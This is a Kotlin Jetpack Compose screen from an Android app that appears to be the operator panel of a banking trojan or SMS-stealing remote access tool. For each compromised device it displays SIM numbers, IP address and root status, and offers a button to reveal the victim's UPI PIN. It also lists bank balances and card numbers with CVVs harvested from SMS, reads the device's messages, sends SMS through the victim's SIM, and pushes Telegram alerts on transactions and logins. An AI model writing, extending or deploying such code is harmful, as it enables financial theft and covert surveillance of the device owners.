package com.zenin.app.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewmodel.compose.viewModel
import com.zenin.app.data.Device
import com.zenin.app.data.SmsMessage
import com.zenin.app.data.formatRupee
import com.zenin.app.ui.components.*
import com.zenin.app.ui.components.octagonShape
import com.zenin.app.ui.theme.*
import com.zenin.app.viewmodel.DeviceDetailViewModel

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DeviceDetailScreen(
    device: Device,
    onBack: () -> Unit
) {
    val vm: DeviceDetailViewModel = viewModel(
        key = "${device.panelId}/${device.id}",
        factory = DeviceDetailViewModel.Factory(device.id, device.panelId)
    )

    LaunchedEffect(device.id) { vm.setDevice(device) }

    val state by vm.state.collectAsStateWithLifecycle()
    var selectedTab by remember { mutableIntStateOf(0) }
    var showSendSms by remember { mutableStateOf(false) }
    var showDeleteConfirm by remember { mutableStateOf(false) }
    var showNoteEditor by remember { mutableStateOf(false) }

    val snackbarHostState = remember { SnackbarHostState() }
    LaunchedEffect(state.sendResult) {
        state.sendResult?.let {
            snackbarHostState.showSnackbar(it)
            vm.clearSendResult()
        }
    }
    LaunchedEffect(state.isDeleted) {
        if (state.isDeleted) onBack()
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text(
                            state.device?.name ?: device.name,
                            style = TextStyle(fontFamily = OrbitronFamily, fontWeight = FontWeight.Bold,
                                fontSize = 15.sp, color = OnSurface, letterSpacing = 1.sp)
                        )
                        val online = state.device?.status ?: device.status
                        Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            StatusDot(online, modifier = Modifier.size(8.dp))
                            Text(
                                if (online) "ONLINE" else "OFFLINE",
                                style = TextStyle(fontFamily = MonoFamily, fontSize = 10.sp,
                                    color = if (online) Online else Offline, letterSpacing = 1.sp)
                            )
                        }
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = CyanDim)
                    }
                },
                actions = {
                    IconButton(onClick = { vm.loadSms() }) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh", tint = CyanDim)
                    }
                    IconButton(onClick = { showDeleteConfirm = true }) {
                        Icon(Icons.Default.Delete, contentDescription = "Delete device", tint = Offline)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = BgDark)
            )
        },
        floatingActionButton = {
            if (selectedTab == 1) {
                FloatingActionButton(
                    onClick = { showSendSms = true },
                    containerColor = Cyan,
                    contentColor = BgDark
                ) {
                    Icon(Icons.Default.Send, contentDescription = "Send SMS")
                }
            }
        },
        snackbarHost = { SnackbarHost(snackbarHostState) },
        containerColor = BgDark
    ) { padding ->
        Column(modifier = Modifier.fillMaxSize().padding(padding)) {
            TabRow(
                selectedTabIndex = selectedTab,
                containerColor = Surface,
                contentColor = Cyan
            ) {
                Tab(
                    selected = selectedTab == 0,
                    onClick = { selectedTab = 0 },
                    text = {
                        Text("INFO", style = TextStyle(fontFamily = OrbitronFamily, fontSize = 11.sp,
                            letterSpacing = 2.sp, color = if (selectedTab == 0) Cyan else OnSurfaceDim))
                    }
                )
                Tab(
                    selected = selectedTab == 1,
                    onClick = { selectedTab = 1 },
                    text = {
                        Text("SMS (${state.smsMessages.size})", style = TextStyle(fontFamily = OrbitronFamily,
                            fontSize = 11.sp, letterSpacing = 2.sp, color = if (selectedTab == 1) Cyan else OnSurfaceDim))
                    }
                )
            }

            when (selectedTab) {
                0 -> InfoTab(
                    device = state.device ?: device,
                    upiPin = state.upiPin,
                    isLoadingUpi = state.isLoadingUpi,
                    notifySettings = state.notifySettings,
                    onRevealUpi = { vm.revealUpiPin() },
                    onEditNote = { showNoteEditor = true },
                    onToggleNotify = { kind, enabled -> vm.toggleNotify(kind, enabled) },
                    onShare = { vm.shareDevice() }
                )
                1 -> SmsTab(messages = state.smsMessages, isLoading = state.isLoadingSms, onRefresh = { vm.loadSms() })
            }
        }
    }

    val shareContext = androidx.compose.ui.platform.LocalContext.current
    LaunchedEffect(state.shareLink) {
        val link = state.shareLink ?: return@LaunchedEffect
        val intent = android.content.Intent(android.content.Intent.ACTION_SEND).apply {
            type = "text/plain"
            putExtra(android.content.Intent.EXTRA_TEXT, link)
        }
        shareContext.startActivity(android.content.Intent.createChooser(intent, "Share device link"))
        vm.clearShareLink()
    }

    if (showSendSms) {
        SendSmsSheet(
            deviceName = state.device?.name ?: device.name,
            isSending = state.isSendingSms,
            onSend = { to, msg, sim -> vm.sendSms(to, msg, sim) },
            onDismiss = { showSendSms = false }
        )
    }

    if (showNoteEditor) {
        NoteEditorDialog(
            initial = state.device?.note ?: device.note,
            onSave = { note -> vm.saveNote(note); showNoteEditor = false },
            onDismiss = { showNoteEditor = false }
        )
    }

    if (showDeleteConfirm) {
        AlertDialog(
            onDismissRequest = { showDeleteConfirm = false },
            containerColor = Surface,
            title = { Text("Delete device?", style = TextStyle(fontFamily = OrbitronFamily, fontWeight = FontWeight.Bold, fontSize = 15.sp, color = OnSurface)) },
            text = { Text("This removes the device record from the panel. This cannot be undone.", style = TextStyle(fontFamily = MonoFamily, fontSize = 13.sp, color = OnSurfaceDim)) },
            confirmButton = {
                TextButton(onClick = { showDeleteConfirm = false; vm.deleteDevice() }) {
                    Text("DELETE", style = TextStyle(fontFamily = MonoFamily, color = Offline, letterSpacing = 1.sp))
                }
            },
            dismissButton = {
                TextButton(onClick = { showDeleteConfirm = false }) {
                    Text("CANCEL", style = TextStyle(fontFamily = MonoFamily, color = CyanDim, letterSpacing = 1.sp))
                }
            }
        )
    }
}

@Composable
private fun NoteEditorDialog(initial: String, onSave: (String) -> Unit, onDismiss: () -> Unit) {
    var text by remember { mutableStateOf(initial) }
    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Surface,
        title = { Text("Device note", style = TextStyle(fontFamily = OrbitronFamily, fontWeight = FontWeight.Bold, fontSize = 15.sp, color = OnSurface)) },
        text = {
            ZeninTextField(
                value = text,
                onValueChange = { text = it },
                label = "NOTE",
                placeholder = "Add a note for this device...",
                singleLine = false,
                modifier = Modifier.height(120.dp)
            )
        },
        confirmButton = {
            TextButton(onClick = { onSave(text) }) {
                Text("SAVE", style = TextStyle(fontFamily = MonoFamily, color = Cyan, letterSpacing = 1.sp))
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("CANCEL", style = TextStyle(fontFamily = MonoFamily, color = CyanDim, letterSpacing = 1.sp))
            }
        }
    )
}

@Composable
private fun InfoTab(
    device: Device,
    upiPin: String?,
    isLoadingUpi: Boolean,
    notifySettings: com.zenin.app.data.NotifySettings?,
    onRevealUpi: () -> Unit,
    onEditNote: () -> Unit,
    onToggleNotify: (com.zenin.app.viewmodel.NotifyKind, Boolean) -> Unit,
    onShare: () -> Unit
) {
    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        item {
            ZeninCard(modifier = Modifier.fillMaxWidth()) {
                SectionHeader("DEVICE INFO")
                Spacer(Modifier.height(8.dp))
                InfoRow("Android", device.androidV)
                InfoRow("SDK", device.sdkV)
                InfoRow("Storage", device.storage)
                InfoRow("CPU", device.cpuArch)
                InfoRow("IP Address", device.ipAddress)
                InfoRow("Root", if (device.isRoot) "Yes" else "No")
                InfoRow("SD Card", if (device.isSdCard) "Yes" else "No")
                InfoRow("Joined", device.joined)
            }
        }
        item {
            ZeninCard(modifier = Modifier.fillMaxWidth()) {
                SectionHeader("SIM CARDS")
                Spacer(Modifier.height(8.dp))
                if (device.sims.isEmpty()) {
                    Text("No SIM info available", style = TextStyle(fontFamily = MonoFamily, fontSize = 12.sp, color = OnSurfaceDim))
                } else {
                    device.sims.forEachIndexed { idx, sim ->
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clip(octagonShape(6f))
                                .background(Surface2)
                                .border(1.dp, CyanFaint, octagonShape(6f))
                                .padding(10.dp),
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Column {
                                Text("SIM ${idx + 1}", style = TextStyle(fontFamily = MonoFamily, fontSize = 10.sp,
                                    color = OnSurfaceDim, letterSpacing = 1.sp))
                                Text(sim.phoneNumber.ifBlank { "—" }, style = TextStyle(fontFamily = MonoFamily,
                                    fontSize = 13.sp, color = OnSurface))
                            }
                            Text(sim.carrierName, style = TextStyle(fontFamily = MonoFamily, fontSize = 11.sp, color = CyanDim))
                        }
                        if (idx < device.sims.size - 1) Spacer(Modifier.height(6.dp))
                    }
                }
            }
        }
        item {
            ZeninCard(modifier = Modifier.fillMaxWidth()) {
                SectionHeader("UPI PIN")
                Spacer(Modifier.height(8.dp))
                val revealed = upiPin
                when {
                    !revealed.isNullOrBlank() -> Text(revealed, style = TextStyle(fontFamily = MonoFamily,
                        fontWeight = FontWeight.Bold, fontSize = 18.sp, color = Cyan, letterSpacing = 4.sp))
                    isLoadingUpi -> Text("Loading…", style = TextStyle(fontFamily = MonoFamily, fontSize = 13.sp, color = OnSurfaceDim))
                    else -> ZeninOutlinedButton(text = "REVEAL UPI PIN", onClick = onRevealUpi)
                }
            }
        }
        if (device.smsAnalysis != null && device.smsAnalysis.hasBank) {
            item {
                ZeninCard(modifier = Modifier.fillMaxWidth()) {
                    SectionHeader("BANK BALANCES")
                    Spacer(Modifier.height(8.dp))
                    device.smsAnalysis.dedupedBanks.forEach { bank ->
                        val label = buildString {
                            append(bank.bankName.ifBlank { bank.senderName }.take(20))
                            if (!bank.accountLast4.isNullOrBlank()) append(" ••${bank.accountLast4}")
                        }
                        InfoRow(label, if (bank.hasBalance) formatRupee(bank.amount) else "—")
                    }
                }
            }
        }
        if (device.smsAnalysis != null && device.smsAnalysis.hasCards) {
            item {
                ZeninCard(modifier = Modifier.fillMaxWidth()) {
                    SectionHeader("CARDS")
                    Spacer(Modifier.height(8.dp))
                    device.smsAnalysis.cards.forEach { card ->
                        val label = "${card.cardType.ifBlank { "CARD" }} ••${card.cardLast4}"
                        val detail = listOfNotNull(
                            card.expiry?.takeIf { it.isNotBlank() }?.let { "exp $it" },
                            card.cvv?.takeIf { it.isNotBlank() }?.let { "cvv $it" }
                        ).joinToString("  ").ifBlank { "—" }
                        InfoRow(label, detail)
                    }
                }
            }
        }
        item {
            ZeninCard(modifier = Modifier.fillMaxWidth()) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    SectionHeader("NOTES")
                    Text("EDIT", modifier = Modifier.clickable(onClick = onEditNote),
                        style = TextStyle(fontFamily = MonoFamily, fontWeight = FontWeight.Bold,
                            fontSize = 10.sp, letterSpacing = 1.sp, color = Cyan))
                }
                Spacer(Modifier.height(8.dp))
                Text(
                    device.note.ifBlank { "No note yet. Tap EDIT to add one." },
                    style = TextStyle(fontFamily = MonoFamily, fontSize = 13.sp,
                        color = if (device.note.isBlank()) OnSurfaceDim else OnSurface)
                )
            }
        }
        item {
            ZeninCard(modifier = Modifier.fillMaxWidth()) {
                SectionHeader("TELEGRAM ALERTS")
                Spacer(Modifier.height(4.dp))
                Text("Get notified in Telegram for this device",
                    style = TextStyle(fontFamily = MonoFamily, fontSize = 11.sp, color = OnSurfaceDim))
                Spacer(Modifier.height(10.dp))
                val ns = notifySettings
                if (ns == null) {
                    Text("Loading…", style = TextStyle(fontFamily = MonoFamily, fontSize = 12.sp, color = OnSurfaceDim))
                } else {
                    NotifyToggleRow("Transactions", "Bank / wallet transaction SMS", ns.transaction) {
                        onToggleNotify(com.zenin.app.viewmodel.NotifyKind.TRANSACTION, it)
                    }
                    NotifyToggleRow("Logins", "New sign-ins on this device", ns.login) {
                        onToggleNotify(com.zenin.app.viewmodel.NotifyKind.LOGIN, it)
                    }
                    NotifyToggleRow("Online / Offline", "Device status changes", ns.onlineOffline) {
                        onToggleNotify(com.zenin.app.viewmodel.NotifyKind.ONLINE_OFFLINE, it)
                    }
                }
            }
        }
        item {
            ZeninCard(modifier = Modifier.fillMaxWidth()) {
                SectionHeader("SHARE")
                Spacer(Modifier.height(8.dp))
                Text("Generate a read-only link to this device's live view.",
                    style = TextStyle(fontFamily = MonoFamily, fontSize = 11.sp, color = OnSurfaceDim))
                Spacer(Modifier.height(12.dp))
                ZeninOutlinedButton(text = "GENERATE SHARE LINK", onClick = onShare,
                    modifier = Modifier.fillMaxWidth())
            }
        }
        item { Spacer(Modifier.height(16.dp)) }
    }
}

@Composable
private fun NotifyToggleRow(title: String, subtitle: String, checked: Boolean, onChange: (Boolean) -> Unit) {
    Row(
        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Column(modifier = Modifier.weight(1f)) {
            Text(title, style = TextStyle(fontFamily = MonoFamily, fontSize = 13.sp, color = OnSurface))
            Text(subtitle, style = TextStyle(fontFamily = MonoFamily, fontSize = 10.sp, color = OnSurfaceDim))
        }
        Switch(checked = checked, onCheckedChange = onChange)
    }
}

@Composable
private fun SmsTab(messages: List<SmsMessage>, isLoading: Boolean, onRefresh: () -> Unit) {
    if (isLoading && messages.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            CircularProgressIndicator(color = Cyan, strokeWidth = 2.dp)
        }
        return
    }
    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(16.dp),
        verticalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        if (messages.isEmpty()) {
            item {
                Box(modifier = Modifier.fillMaxWidth().padding(40.dp), contentAlignment = Alignment.Center) {
                    Text("No SMS messages", style = TextStyle(fontFamily = MonoFamily, fontSize = 13.sp, color = OnSurfaceDim))
                }
            }
        } else {
            items(messages, key = { it.key }) { sms -> SmsRow(sms) }
        }
        item { Spacer(Modifier.height(72.dp)) }
    }
}

@Composable
private fun SmsRow(sms: SmsMessage) {
    var expanded by remember { mutableStateOf(false) }
    val isIncoming = sms.type == "incoming"
    Column(
        modifier = Modifier
            .fillMaxWidth()
            .clip(octagonShape(8f))
            .background(Surface)
            .border(1.dp, if (isIncoming) CyanFaint else Online.copy(alpha = 0.2f), octagonShape(8f))
            .clickable { expanded = !expanded }
            .padding(12.dp)
    ) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.Top
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(sms.sender, style = TextStyle(fontFamily = MonoFamily, fontWeight = FontWeight.Bold,
                    fontSize = 12.sp, color = if (isIncoming) Cyan else Online, letterSpacing = 0.5.sp))
                Spacer(Modifier.height(3.dp))
                Text(
                    if (expanded) sms.message else sms.message.take(80) + if (sms.message.length > 80) "…" else "",
                    style = TextStyle(fontFamily = MonoFamily, fontSize = 12.sp, color = OnSurface)
                )
            }
            Column(horizontalAlignment = Alignment.End) {
                ZeninChip(text = if (isIncoming) "IN" else "OUT", color = if (isIncoming) Cyan else Online)
                Spacer(Modifier.height(4.dp))
                Text(sms.dateTime.take(16).replace("T", "\n"),
                    style = TextStyle(fontFamily = MonoFamily, fontSize = 9.sp, color = OnSurfaceDim))
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
private fun SendSmsSheet(deviceName: String, isSending: Boolean, onSend: (String, String, Int) -> Unit, onDismiss: () -> Unit) {
    var to by remember { mutableStateOf("") }
    var message by remember { mutableStateOf("") }
    var sim by remember { mutableIntStateOf(1) }

    ModalBottomSheet(onDismissRequest = onDismiss, containerColor = Surface) {
        Column(
            modifier = Modifier.fillMaxWidth().padding(horizontal = 24.dp).padding(bottom = 32.dp).imePadding()
        ) {
            Text("SEND SMS", style = TextStyle(fontFamily = OrbitronFamily, fontWeight = FontWeight.Black,
                fontSize = 13.sp, letterSpacing = 3.sp, color = Cyan))
            Text("via $deviceName", style = TextStyle(fontFamily = MonoFamily, fontSize = 11.sp, color = OnSurfaceDim))
            Spacer(Modifier.height(16.dp))

            ZeninTextField(value = to, onValueChange = { to = it }, label = "TO NUMBER", placeholder = "+91 XXXXXXXXXX",
                keyboardOptions = androidx.compose.foundation.text.KeyboardOptions(
                    keyboardType = androidx.compose.ui.text.input.KeyboardType.Phone,
                    imeAction = androidx.compose.ui.text.input.ImeAction.Next))
            Spacer(Modifier.height(12.dp))
            ZeninTextField(value = message, onValueChange = { message = it }, label = "MESSAGE",
                placeholder = "Type your message...", singleLine = false, modifier = Modifier.height(100.dp))
            Spacer(Modifier.height(12.dp))

            Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                Text("SIM:", style = TextStyle(fontFamily = MonoFamily, fontSize = 12.sp, color = OnSurfaceDim))
                listOf(1, 2).forEach { s ->
                    FilterChip(selected = sim == s, onClick = { sim = s },
                        label = { Text("SIM $s", style = TextStyle(fontFamily = MonoFamily, fontSize = 11.sp)) },
                        colors = FilterChipDefaults.filterChipColors(
                            selectedContainerColor = Cyan.copy(alpha = 0.2f), selectedLabelColor = Cyan))
                }
            }
            Spacer(Modifier.height(16.dp))
            ZeninButton(text = "SEND", onClick = { if (to.isNotBlank() && message.isNotBlank()) { onSend(to, message, sim); onDismiss() } },
                loading = isSending, modifier = Modifier.fillMaxWidth())
        }
    }
}
